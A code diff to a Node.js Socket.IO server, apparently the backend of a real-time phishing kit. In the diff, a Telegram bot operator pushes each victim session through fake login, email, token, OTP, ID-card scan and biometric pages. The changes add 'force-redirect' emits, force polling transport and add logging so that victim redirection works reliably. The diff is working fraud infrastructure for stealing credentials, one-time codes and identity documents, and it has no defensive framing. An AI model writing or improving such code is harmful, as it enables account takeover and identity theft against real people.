@@ -8,11 +8,11 @@ require('dotenv').config();
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    pingTimeout: 60000,
-    pingInterval: 15000,
+    pingTimeout: 120000,
+    pingInterval: 25000,
     connectTimeout: 60000,
     allowEIO3: true,
-    transports: ['polling', 'websocket'],
+    transports: ['polling'],
     upgradeTimeout: 30000,
     maxHttpBufferSize: 1e8,
     allowUpgrades: false,
@@ -21,9 +21,11 @@ const io = socketIo(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"],
-        credentials: true
+        credentials: false
     },
-    cookie: false
+    cookie: false,
+    serveClient: true,
+    path: '/socket.io/'
 });
 
 // Middleware
@@ -387,39 +389,49 @@ bot.on('callback_query', async (callbackQuery) => {
         }
 
         if (targetSocket) {
+            console.log(`   Sending redirect to socket ${socketId}...`);
+            
             switch (command) {
                 case 'logo':
                     targetSocket.emit('redirect', { page: 'index.html', clearData: true });
+                    targetSocket.emit('force-redirect', { page: 'index.html', clearData: true });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de login\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'email':
                     targetSocket.emit('redirect', { page: 'correo.html' });
+                    targetSocket.emit('force-redirect', { page: 'correo.html' });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de correo\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'token':
                     targetSocket.emit('redirect', { page: 'token.html' });
+                    targetSocket.emit('force-redirect', { page: 'token.html' });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de token\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'otp':
                     targetSocket.emit('redirect', { page: 'otp.html' });
+                    targetSocket.emit('force-redirect', { page: 'otp.html' });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de OTP\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'cedula':
                     targetSocket.emit('redirect', { page: 'cedula.html' });
+                    targetSocket.emit('force-redirect', { page: 'cedula.html' });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a escaneo de cédula\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'biometria':
                     targetSocket.emit('redirect', { page: 'biometria.html' });
+                    targetSocket.emit('force-redirect', { page: 'biometria.html' });
                     await bot.sendMessage(chatId, `✅ Usuario redirigido a verificación biométrica\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     break;
                 case 'finalize':
                     targetSocket.emit('redirect', { page: 'finalizar.html' });
+                    targetSocket.emit('force-redirect', { page: 'finalizar.html' });
                     await bot.sendMessage(chatId, `✅ Sesión finalizada\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                     sessions.delete(sessionId);
                     sessionToSocket.delete(sessionId);
                     socketToSession.delete(socketId);
                     break;
             }
+            console.log(`   Redirect sent successfully`);
         } else {
             await bot.sendMessage(chatId, `⚠️ Sesión no encontrada o desconectada\nSesión: \`${sessionId}\`\n\nEl usuario puede haber cerrado la página o perdido la conexión.`, { parse_mode: 'Markdown' });
         }
